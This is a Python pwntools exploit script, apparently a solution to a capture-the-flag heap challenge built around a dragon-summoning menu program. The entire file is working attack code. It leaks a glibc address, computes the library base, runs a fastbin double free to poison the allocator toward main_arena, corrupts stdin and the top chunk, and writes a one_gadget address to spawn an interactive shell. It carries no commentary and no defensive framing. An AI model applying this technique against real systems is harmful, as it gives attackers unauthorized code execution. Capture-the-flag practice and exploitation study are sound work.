#!/usr/bin/env python3

from pwn import context, ELF, log, p64, remote, sys, u64

context.binary = 'da'
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def summon(p, length: int, name: bytes):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b"Dragon's length: ", str(length).encode())
    p.sendlineafter(b'Name your dragon: ', name)


def release(p, index: int):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Dragon of choice: ', str(index).encode())


def main():
    p = get_process()

    p.sendafter(b"Cast a magic spell to enhance your army's power: ", b'r3dDr4g3nst1str0f1'.ljust(0x30, b'A'))

    p.recvline()
    data = p.recvline()[:-1]
    __GI__IO_file_jumps_addr = u64(data.split(b'A')[-1].ljust(8, b'\0'))
    log.info(f'Leaked __GI__IO_file_jumps address: {hex(__GI__IO_file_jumps_addr)}')

    glibc.address = __GI__IO_file_jumps_addr - glibc.sym.__GI__IO_file_jumps
    log.success(f'Glibc base address: {hex(glibc.address)}')

    summon(p, 0x48, b'A')  # 0
    summon(p, 0x48, b'B')  # 1

    summon(p, 0x28, b'X')  # 2
    release(p, 2)

    release(p, 0)
    release(p, 1)
    release(p, 0)

    summon(p, 0x48, p64(glibc.sym.main_arena + 0x15))  # 3

    summon(p, 0x48, b'B')  # 4
    summon(p, 0x48, b'A')  # 5

    summon(p, 0x48, b'\0' * 3 + p64(glibc.sym._IO_2_1_stdin_ + 61) + p64(0) * 6 + p64(glibc.sym._IO_2_1_stdin_ + 112))  # 6
    summon(p, 0x48, b'\0' * 3 + p64(0) * 5 + p64(0x1fb11))  # 7

    summon(p, 0x78, b'')  # 8
    summon(p, 0x78, b'')  # 9
    summon(p, 0x58, b'')  # 10

    one_gadget = glibc.address + (0xc4dbf, 0xe1fa1, 0xe1fad)[1]
    summon(p, 0x38, p64(0) * 2 + p64(one_gadget))  # 11

    p.sendlineafter(b'>> ', b'1')  # 12
    p.sendlineafter(b"Dragon's length: ", b'24')

    p.interactive()


if __name__ == '__main__':
    main()
